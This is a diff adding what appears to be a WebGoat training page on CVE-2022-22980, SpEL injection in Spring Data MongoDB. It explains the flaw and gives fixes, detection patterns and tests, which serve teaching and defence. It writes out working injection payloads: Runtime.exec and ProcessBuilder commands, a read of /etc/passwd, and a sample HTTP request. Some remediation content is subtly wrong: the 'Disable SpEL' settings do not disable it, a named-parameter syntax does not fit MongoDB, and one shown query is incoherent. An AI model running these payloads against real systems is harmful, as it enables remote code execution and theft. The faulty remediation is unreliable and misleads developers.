@@ -1,0 +1,398 @@
+= CVE-2022-22980: Spring Data MongoDB SpEL Injection
+
+== Overview
+
+CVE-2022-22980 is a critical vulnerability in Spring Data MongoDB that allows Remote Code Execution (RCE) through SpEL (Spring Expression Language) Injection. The vulnerability exists in versions prior to 3.4.0 where the `@Query` and `@Aggregation` annotated query methods process user-supplied input without proper escaping.
+
+**Severity**: CVSS 9.8 (Critical)
+**Affected**: Spring Data MongoDB < 3.4.0
+**Fixed in**: Spring Data MongoDB 3.4.0+
+
+== Vulnerability Details
+
+=== Root Cause
+
+Spring Data MongoDB provides a convenient way to define database queries using the `@Query` and `@Aggregation` annotations. The vulnerability occurs when:
+
+1. User-supplied input is passed to query methods annotated with `@Query`
+2. The query contains SpEL expressions with placeholder syntax like `?#{?0}`
+3. SpEL expressions are evaluated without proper validation or escaping
+4. Attackers can inject arbitrary SpEL code to access system objects
+5. SpEL has access to Runtime, ProcessBuilder, and other dangerous classes
+
+=== Why It's Vulnerable
+
+1. **Unvalidated SpEL Evaluation**: Query placeholders evaluate SpEL expressions
+2. **Direct Parameter Access**: SpEL `?0` syntax directly references method parameters
+3. **No Input Sanitization**: User input is not escaped or validated
+4. **Unrestricted Class Access**: SpEL can instantiate and invoke any Java class
+5. **Runtime Access**: Can invoke `java.lang.Runtime.exec()` for command execution
+
+=== Vulnerable Code Pattern
+
+[source,java]
+----
+// VULNERABLE: Spring Data MongoDB < 3.4.0
+@Query("{ 'firstName' : ?#{?0} }")
+public Customer findByFirstName(String firstName);
+
+// When called with SpEL payload:
+customerRepository.findByFirstName(
+    "' + T(java.lang.Runtime).getRuntime().exec('calc') + '"
+);
+----
+
+== Attack Vector
+
+=== SpEL Injection via @Query Annotation
+
+The attacker crafts malicious SpEL expressions that exploit query parameter placeholders:
+
+[source,java]
+----
+// Malicious payload
+String payload = "') " + 
+    "|| (T(java.lang.Runtime).getRuntime().exec(new String[]{'calc'}), '') || ('";
+
+// This gets injected into the @Query
+@Query("{ 'firstName' : ?#{?0} }")
+public Customer findByFirstName(String firstName);
+
+// Results in:
+// { 'firstName' : '') || (T(java.lang.Runtime).getRuntime()...
+----
+
+=== Exploitation Chain
+
+[source]
+----
+1. Attacker crafts SpEL expression
+   └─> Contains T(java.lang.Runtime).getRuntime().exec()
+
+2. Application receives user input via HTTP request
+   └─> firstName parameter contains SpEL payload
+
+3. Application calls repository method
+   └─> findByFirstName(userInput)
+
+4. Spring Data MongoDB processes @Query annotation
+   └─> Evaluates SpEL expression with placeholder ?#{?0}
+
+5. User input is substituted into SpEL context
+   └─> SpEL parser evaluates the full expression
+
+6. Dangerous T() operator accesses Java classes
+   └─> java.lang.Runtime class is accessible
+
+7. Runtime.exec() is invoked
+   └─> Arbitrary command execution
+
+8. Remote Code Execution achieved
+   └─> Attacker gains system access
+----
+
+== Attack Examples
+
+=== Example 1: Command Execution via SpEL
+
+[source]
+----
+HTTP Request:
+POST /search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+firstName=') or (T(java.lang.Runtime).getRuntime().exec('whoami'), '') or ('
+----
+
+Results in MongoDB query:
+[source,javascript]
+----
+db.customer.find({ 
+    firstName: "") or (T(java.lang.Runtime).getRuntime().exec('whoami'), "") or ("
+})
+----
+
+=== Example 2: ProcessBuilder for Command Execution
+
+[source]
+----
+Payload:
+firstName=') or (T(java.lang.ProcessBuilder).new(
+    'calc'
+).start(), '') or ('
+
+Executes: calc.exe
+----
+
+=== Example 3: File System Access
+
+[source]
+----
+Payload:
+firstName=') or (T(java.nio.file.Files).readAllLines(
+    T(java.nio.file.Paths).get('/etc/passwd')
+), '') or ('
+
+Reads: /etc/passwd file content
+----
+
+=== Example 4: Environment Variable Access
+
+[source]
+----
+Payload:
+firstName=') or (T(java.lang.System).getenv('PATH'), '') or ('
+
+Returns: System PATH variable
+----
+
+== Consequences
+
+=== Impact Severity: **CRITICAL** (CVSS 9.8)
+
+- **Remote Code Execution**: Complete system compromise
+- **No Authentication Required**: Unauthenticated exploitation
+- **File System Access**: Read/write arbitrary files
+- **Process Execution**: Run system commands with app privileges
+- **Environment Access**: Read system environment variables
+- **Database Manipulation**: Direct MongoDB database access
+- **Data Theft**: Access sensitive information
+- **System Compromise**: Install backdoors or persistence mechanisms
+
+== Remediation Strategies
+
+=== 1. Upgrade Spring Data MongoDB (Immediate)
+
+Update to patched version:
+
+[source,xml]
+----
+<dependency>
+    <groupId>org.springframework.data</groupId>
+    <artifactId>spring-data-mongodb</artifactId>
+    <version>3.4.0</version>
+</dependency>
+----
+
+=== 2. Avoid Dynamic @Query with User Input
+
+Never use `?#{?0}` syntax with user-supplied input:
+
+[source,java]
+----
+// VULNERABLE
+@Query("{ 'firstName' : ?#{?0} }")
+public Customer findByFirstName(String firstName);
+
+// SAFE - Use simple placeholder
+@Query("{ 'firstName' : ?0 }")
+public Customer findByFirstName(String firstName);
+----
+
+=== 3. Input Validation and Sanitization
+
+Validate and sanitize all user input:
+
+[source,java]
+----
+private boolean isValidInput(String input) {
+    // Reject SpEL operators
+    String[] dangerousChars = {"T(", "#{", "${", "?", "()", "exec", "Runtime"};
+    
+    for (String dangerous : dangerousChars) {
+        if (input.toLowerCase().contains(dangerous.toLowerCase())) {
+            return false;
+        }
+    }
+    
+    // Only allow alphanumeric and basic symbols
+    return input.matches("^[a-zA-Z0-9._-]+$");
+}
+
+public Customer findByFirstName(String firstName) {
+    if (!isValidInput(firstName)) {
+        throw new IllegalArgumentException("Invalid input detected");
+    }
+    return repository.findByFirstName(firstName);
+}
+----
+
+=== 4. Use Query DSL or QueryBuilder
+
+Use type-safe query builders instead of string-based queries:
+
+[source,java]
+----
+// SAFE - Using Query DSL
+Query query = new Query(Criteria.where("firstName").is(firstName));
+Customer customer = mongoTemplate.findOne(query, Customer.class);
+----
+
+=== 5. Disable SpEL in Queries
+
+Configure Spring Data to not evaluate SpEL:
+
+[source,java]
+----
+// In application.properties
+spring.data.mongodb.lazy-initialization=true
+spring.data.mongodb.auto-index-creation=false
+
+// Or disable SpEL at application level
+// Use MongoOperations directly instead of @Query annotations
+----
+
+=== 6. Use Parameterized Queries
+
+Always use parameterized query syntax:
+
+[source,java]
+----
+// SAFE - Parameters are not evaluated as SpEL
+@Query("{ 'firstName' : ?0 }")
+public Customer findByFirstName(String firstName);
+
+// SAFE - Named parameters
+@Query("{ 'firstName' : :firstName }")
+public Customer findByFirstName(@Param("firstName") String firstName);
+----
+
+== Detection & Monitoring
+
+=== Log Patterns Indicating Exploitation
+
+Watch for these patterns in logs and requests:
+
+[source]
+----
+T(java.lang.Runtime)
+T(java.lang.ProcessBuilder)
+getRuntime()
+exec(
+?#{
+${
+new String[]
+java.io.File
+java.nio.file
+----
+
+=== Request Pattern Analysis
+
+Monitor incoming requests for suspicious patterns:
+
+[source,bash]
+----
+# Look for SpEL operators in query parameters
+grep -i "T(java" /var/log/application.log
+
+# Monitor for command execution attempts
+grep -i "exec\|cmd\|bash\|sh" /var/log/application.log
+
+# Check for file system access
+grep -i "readAllLines\|write\|delete" /var/log/application.log
+----
+
+=== MongoDB Query Monitoring
+
+Monitor MongoDB logs for unusual queries:
+
+[source,javascript]
+----
+// MongoDB slow query log
+db.system.profile.find({
+    "command.firstName": {$regex: /T\(java/}
+})
+----
+
+== Testing & Validation
+
+=== Test for Vulnerability
+
+[source,java]
+----
+@Test
+public void testSpelInjectionVulnerability() {
+    String maliciousInput = "') || (T(java.lang.Runtime).getRuntime().exec('calc'), '') || ('";
+    
+    // This should NOT execute the command in patched version
+    Customer result = customerRepository.findByFirstName(maliciousInput);
+    
+    // In vulnerable version, 'calc' would be executed
+    // In patched version, it should be treated as literal string
+    assertNotNull(result);
+}
+
+@Test
+public void testInputValidation() {
+    String maliciousInput = "T(java.lang.Runtime).getRuntime().exec('whoami')";
+    
+    assertThrows(IllegalArgumentException.class, () -> {
+        customerRepository.findByFirstName(maliciousInput);
+    });
+}
+----
+
+=== Test Safe Query Methods
+
+[source,java]
+----
+@Test
+public void testSafeQuery() {
+    // Use simple placeholder - safe even with special input
+    String input = "John'; DROP TABLE customers; --";
+    
+    Customer customer = customerRepository.findByFirstName(input);
+    
+    // Should return null (no match) or specific customer
+    // Should NOT execute DROP TABLE command
+    assertNull(customer);
+}
+----
+
+== References
+
+- link:https://nvd.nist.gov/vuln/detail/CVE-2022-22980[NVD CVE-2022-22980]
+- link:https://spring.io/security/cve-2022-22980[Spring Security Advisory]
+- link:https://github.com/spring-projects/spring-data-mongodb/releases/tag/3.4.0[Spring Data MongoDB 3.4.0 Release]
+- link:https://owasp.org/www-community/attacks/Expression_Language_Injection[OWASP Expression Language Injection]
+- link:https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions[Spring Expression Language Docs]
+
+== Exploit Hints for WebGoat Exercise
+
+**Challenge Level**: Advanced
+**Objective**: Exploit SpEL injection via @Query parameter
+
+=== Key Concepts
+
+1. **SpEL Syntax**: Spring Expression Language uses T() to access Java classes
+2. **Parameter Substitution**: `?#{?0}` evaluates SpEL with method parameter
+3. **Runtime Access**: T(java.lang.Runtime) gives access to command execution
+4. **No Validation**: User input is directly evaluated in SpEL context
+
+=== Attack Pattern
+
+[source]
+----
+SpEL T() operator:
+    T(java.lang.Runtime)
+
+Method Call:
+    getRuntime() → Returns Runtime instance
+
+Command Execution:
+    exec(command) → Executes system command
+
+Complete Payload:
+    T(java.lang.Runtime).getRuntime().exec('whoami')
+----
+
+== Summary
+
+CVE-2022-22980 demonstrates the dangers of evaluating untrusted SpEL expressions. Spring Expression Language is powerful for legitimate use cases but becomes dangerous when user input is directly evaluated without proper escaping or validation.
+
+**Immediate Actions Required:**
+1. ✅ Upgrade Spring Data MongoDB to 3.4.0+
+2. ✅ Replace `?#{?0}` with simple `?0` placeholders
+3. ✅ Validate and sanitize all user input
+4. ✅ Use Query DSL or QueryBuilder for type-safe queries
+5. ✅ Monitor for exploitation attempts in logs
